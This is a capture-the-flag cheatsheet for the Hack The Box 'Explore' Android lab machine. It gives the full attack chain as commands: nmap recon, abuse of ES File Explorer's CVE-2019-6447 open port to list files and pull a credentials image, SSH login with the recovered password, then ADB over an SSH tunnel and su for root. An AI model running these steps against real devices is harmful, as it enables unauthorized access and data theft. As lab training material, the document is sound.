# HTB: Explore — Command Cheatsheet

## 📌 Box Info
- **Name:** Explore
- **IP:** 10.10.10.247
- **OS:** Android
- **Difficulty:** Easy

---

## 🔍 Recon
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.247
nmap -p 2222,38925,42135,59777 -sCV -oA scans/nmap-tcpscripts 10.10.10.247
```

---

## 🛡️ CVE-2019-6447 — ES File Explorer
```bash
# Test access
curl 10.10.10.247:59777

# Enumerate files
curl 10.10.10.247:59777 -d '{"command": "listFiles"}'

# List images (look for creds.jpg)
curl 10.10.10.247:59777 -d '{"command": "listPics"}'

# Download image with password
python poc.py --get-file /storage/emulated/0/DCIM/creds.jpg --host 10.10.10.247
```

---

## 🗑️ Shell as kristi
```bash
sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh -p 2222 kristi@10.10.10.247

# Look for user.txt
cd /storage/emulated/0
cat user.txt
```

---

## 🤎 Enumeration as kristi
```bash
netstat -tnlp  # confirm port 5555 is open
```

---

## ⚖️ ADB Setup (Port Forwarding)
```bash
# Reconnect SSH with port forward
ssh -L 5555:localhost:5555 -p 2222 kristi@10.10.10.247

# On local machine
adb connect localhost:5555
adb devices
adb shell
```

---

## 🤐 Root Access via ADB
```bash
adb shell
su

# Locate and read flag
find / -name root.txt 2>/dev/null
cat /data/root.txt
```

---

## 📑 Resources
- CVE-2019-6447: ES File Explorer RCE
- ADB: Android Debug Bridge over SSH Tunnel
- ES File Explorer Exploit Script: https://github.com/fs0c131y/ESFileExplorerOpenPortVuln